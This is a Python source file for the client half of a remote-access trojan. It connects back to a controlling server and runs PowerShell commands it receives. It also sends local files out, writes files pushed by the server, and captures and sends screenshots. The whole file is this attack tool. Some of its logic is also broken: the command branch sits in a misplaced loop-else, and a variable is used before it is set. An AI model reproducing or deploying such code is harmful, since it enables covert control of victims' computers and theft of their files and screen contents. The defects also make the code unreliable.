import os.path
import socket
import subprocess
import time
import sys
import pyautogui
from datetime import datetime

eof = '<end_of_result>'
chunk_size = 2048
server_IP = socket.gethostbyname(socket.gethostname())  # --> or you can specify an IP manually.
Port = 1080

class TerminatingException(Exception):
    "Raised when the input value is stop"
    pass

class SP:
    def client(self):
        while True:
            try:
                print("Trying to connect..")
                #                   IPV4                TCP
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # --> 1.Create a socket
                s.connect((server_IP, Port))  # --> 2. Connect to the socket
                print('* Connection is established *')

                while True:
                    # --> 3. Send and receive data.
                    command = s.recv(1024).decode('utf-8')  # -->  Receiving ACK

                    if command.lower() == 'stop':
                        raise TerminatingException()

                    elif command == "":
                        continue

                    elif len(command) == 2 and command[0].isalpha() and command[1] == ':':  # --> d:
                        if os.path.exists(new_path):
                            os.chdir(new_path)
                            continue
                        else:
                            print(new_path, " is not exist!")
                            continue

                    elif command.startswith('cd'):
                        new_path = command.strip('cd ')
                        if os.path.exists(new_path):
                            os.chdir(new_path)
                            continue
                        else:
                            print(new_path, " is not exist!")
                            continue

                    elif command.startswith("download"):
                        file_to_download = command.strip("download ")
                        if os.path.exists(file_to_download) and os.path.isfile(file_to_download):
                            exists = "yes"
                            s.send(exists.encode())
                            with open(file_to_download, "rb") as file:
                                chunk = file.read(chunk_size)

                                while len(chunk) > 0:
                                    s.send(chunk)
                                    chunk = file.read(2048)
                                s.send(eof.encode())
                            print("File sent successfully")
                            continue
                        else:
                            exists = "no"
                            print("File doesn't exist")
                            s.send(exists.encode())
                            continue

                    elif command.startswith("upload"):
                        exists = s.recv(1024)
                        if exists.decode() == "yes":
                            answer = "yes"
                            s.send(answer.encode())
                            file_name = command.strip("upload ")
                            with open(file_name, "wb") as download_file:
                                print("Downloading file")
                                while True:
                                    chunk = s.recv(chunk_size)
                                    if chunk.endswith(eof.encode()):
                                        chunk = chunk[:-len(eof)]
                                        download_file.write(chunk)
                                        break
                                    download_file.write(chunk)

                            print("File Downloaded successfully")
                        else:
                            print("File not exists")
                            continue

                    elif command == "screenshot":
                        now = datetime.now()
                        now = now.strftime("%m-%d-%Y-%H.%M.%S")
                        print("Take Screenshot")
                        myscreen = pyautogui.screenshot()
                        myscreen.save("c:\\programdata\\" + now + '.png')
                        print("Screenshot Saved")
                        saved_file = now + '.png'
                        s.send(saved_file.encode())
                        os.chdir("c:\\programdata\\")
                        if os.path.exists(saved_file):
                            exists = "yes"
                            s.send(exists.encode())
                            answer = s.recv(1024)
                            if answer.decode() == "yes":
                                with open(saved_file, "rb") as file:
                                    chunk = file.read(chunk_size)
                                    print("Uploading FIle ... ")
                                    while len(chunk) > 0:
                                        s.send(chunk)
                                        chunk = file.read(2048)
                                        # This will run till the end of file.

                                    # once the file is complete, we need to send the marker.
                                    s.send(eof.encode())
                                print("File sent successfully")
                                os.remove(saved_file)
                        else:
                            exists = "no"
                            print("File doesn't exist")
                            s.send(exists.encode())
                            continue

                else:
                        output = subprocess.run(['powershell.exe', command], shell=True, capture_output=True,
                                                stdin=subprocess.DEVNULL)

                        if output.stderr:  # if the command cause an error
                            result = output.stderr.decode('utf-8') + eof
                            result = result.encode('utf-8')

                            s.sendall(result)
                        else:  # if the command  has output
                            result = output.stdout.decode('utf-8') + eof
                            result = result.encode('utf-8')
                            s.sendall(result)
                        break

            except WindowsError as ex:
                print("Connection didn't succeed!")
                time.sleep(3)

            except TerminatingException as ex:
                s.send('Terminating Client.. '.encode())
                s.close()
                sys.exit()

            except BaseException as ex:
                print(f"Exception caught: {ex}")
                s.close()


obj = SP()
obj.client()
